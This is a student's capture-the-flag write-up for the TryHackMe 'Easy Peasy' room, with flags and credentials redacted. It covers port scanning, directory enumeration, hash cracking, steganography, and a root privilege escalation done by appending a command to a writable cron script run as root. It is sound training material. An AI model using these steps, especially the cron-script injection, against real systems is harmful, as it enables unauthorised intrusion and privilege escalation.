# CTF Write-up: Easy Peasy (A.M.L.CTF)
**Platform:** TryHackMe  
**Difficulty:** Easy
**Date:** March 3, 2026  
**Author:** Yasir  
**Status:** ✅ Completed  

> ⚠️ **Spoiler Warning:** This write-up contains hints and methodology for the Easy Peasy room on TryHackMe. Try the room yourself before reading!

---

## Overview

Easy Peasy is an easy-difficulty CTF on TryHackMe that covers web enumeration, hash cracking, steganography, and Linux privilege escalation. It was trickier than expected because services were running on non-standard ports, and credentials were hidden using multiple layers of encoding.

This was my second CTF room on the Junior Penetration Tester path, done to reinforce what I learned in the Intro to Web Hacking module.

| Item | Details |
|------|---------|
| Target IP | 10.112.169.33 |
| Flags | 5 (3 web + user + root) |
| Tools | Nmap, Gobuster, John the Ripper, Steghide, CyberChef, SSH |
| Skills | Enumeration, Hash cracking, Steganography, Privilege Escalation |

---

## Step 1 — Enumeration with Nmap

First thing I always do — scan ALL ports. Default nmap only scans the top 1000, which would have missed two of the three web services on this machine.

```bash
nmap -p- --min-rate 5000 -sV 10.112.169.33
```

**Results:**
- Port 80 — nginx 1.16.1
- Port 6498 — OpenSSH 7.6p1 (non-standard port!)
- Port 65524 — Apache 2.4.43 (second web server!)

> 💡 **Tip:** Always use `-p-` to scan all 65535 ports. Non-standard ports are a common CTF trick. Add `--min-rate 5000` to speed it up.

---

## Step 2 — Web Enumeration (Port 80 — nginx)

Started with Gobuster on port 80:

```bash
gobuster dir -u http://10.112.169.33 -w /usr/share/wordlists/dirb/common.txt
```

Found `/hidden` directory. Then enumerated **recursively** inside it:

```bash
gobuster dir -u http://10.112.169.33/hidden -w /usr/share/wordlists/dirb/common.txt
```

Found `/hidden/whatever`. Visited in browser, viewed page source (Ctrl+U) and found a Base64 encoded string.

Decoded it in terminal:

```bash
echo "[BASE64 REDACTED]" | base64 -d
```

**Result: Flag 1 captured ✅**

> 💡 **Tip:** Always enumerate recursively! When Gobuster finds a directory, run it again inside that directory. Hidden content is often nested multiple levels deep.

---

## Step 3 — Web Enumeration (Port 65524 — Apache)

Every open port is an attack surface. Checked `robots.txt` on the Apache server:

```
http://10.112.169.33:65524/robots.txt
```

Found an MD5 hash used as a User-Agent string. Cracked it on hashes.com instantly.

**Result: Flag 2 captured ✅**

Then viewed the page source of the Apache `index.html`. Found two things:

- A hidden paragraph hinting at **Base62** encoding containing a directory path
- Flag 3 embedded directly in the source

Decoded the Base62 string using **CyberChef** to get the hidden directory path.

**Result: Flag 3 captured ✅**

> 💡 **Tip:** Check robots.txt and page source on EVERY web service — not just the main one. Each web server is a separate target.

---

## Step 4 — Steganography & Hash Cracking

Visited the hidden directory found from the Base62 decode. Page source revealed:

- A JPEG image (looked like a decorative Matrix-style binary image)
- A 64-character hash

The image contained hidden data using **steganography**. Downloaded and extracted it:

```bash
wget http://10.112.169.33:65524/[HIDDEN_DIRECTORY]/binarycodepixabay.jpg
steghide extract -sf binarycodepixabay.jpg
```

With an empty passphrase, it extracted a text file containing:
- A username
- A password encoded in **binary**

Decoded the binary in CyberChef using "From Binary" to get the SSH password.

For the hash, used **John the Ripper**. The hash was GOST R 34.11-94 format:

```bash
john hash.txt --wordlist=easypeasy_wordlist.txt --format=gost
john hash.txt --show
```

> 💡 **Tip:** After John finishes always run `john hash.txt --show` to see cracked passwords clearly — the result can scroll past during cracking.

---

## Step 5 — SSH Login & User Flag

SSH was on non-standard port 6498. Logged in with credentials recovered from steganography:

```bash
ssh [USERNAME]@10.112.169.33 -p 6498
```

Found `user.txt` — but the flag was **ROT13 encoded** with a hint saying "Rotated Or Something".

Decoded using CyberChef ROT13 operation.

**Result: User flag captured ✅**

> 💡 **Tip:** ROT13 is easy to spot — the text looks almost readable but nonsensical. Words like `synt` (flag), `gur` (the), `bs` (of) are telltale signs.

---

## Step 6 — Privilege Escalation via Cron Job

Ran standard privilege escalation checks:

```bash
sudo -l          # No sudo access
cat /etc/crontab # Check scheduled tasks
```

Found a critical misconfiguration in crontab:

```
* * * * *  root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

This runs every minute as root! Checked file permissions:

```bash
ls -la /var/www/.mysecretcronjob.sh
```

The script was **owned by our user** — meaning we could write to it! Injected a command:

```bash
echo "cat /root/.root.txt > /tmp/rootflag.txt" >> /var/www/.mysecretcronjob.sh
```

Waited 1 minute then read the flag:

```bash
cat /tmp/rootflag.txt
```

**Result: Root flag captured ✅ Machine fully compromised!**

> 💡 **Tip:** Always check `/etc/crontab` for privilege escalation. If root runs a script you own and can write to — it's game over. This is called **Cron Job Abuse**.

---

## Flags Summary

| Flag | Location | Method |
|------|----------|--------|
| 🏁 Flag 1 | /hidden/whatever page source | Recursive Gobuster + Base64 decode |
| 🏁 Flag 2 | robots.txt hash | MD5 hash cracking |
| 🏁 Flag 3 | Apache index.html source | Direct page source discovery |
| 👤 User Flag | /home/[user]/user.txt via SSH | Steganography + ROT13 decode |
| 👑 Root Flag | /root/.root.txt | Cron job script injection |

---

## What I Learned

- Always scan ALL ports with `nmap -p-` — non-standard ports hide services
- Enumerate EVERY web service found — each one is a separate target
- Always check `robots.txt` and page source on every web service
- Recursive Gobuster — when you find a directory, enumerate inside it too
- Base64 ends with `=` or `==`, Base62 has no padding, ROT13 looks like broken English
- Hash length tells you the type: 32 chars = MD5, 40 = SHA1, 64 = SHA256/GOST
- After John cracks a hash run `--show` to see results clearly
- Steganography hides data inside images — `steghide` is the tool to extract it
- Cron jobs running as root with writable scripts = instant privilege escalation
- File **ownership** matters more than file permissions for privilege escalation

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| Gobuster | Directory and file enumeration |
| John the Ripper | Hash cracking |
| Steghide | Steganography extraction |
| CyberChef | Decoding (Base64, Base62, Binary, ROT13) |
| SSH | Remote system access |
| hash-identifier | Identifying hash types |

---

*Write-up by Yasir | TryHackMe Junior Penetration Tester(Student)*  
*Room: [Easy Peasy](https://tryhackme.com/room/easypeasyctf)*

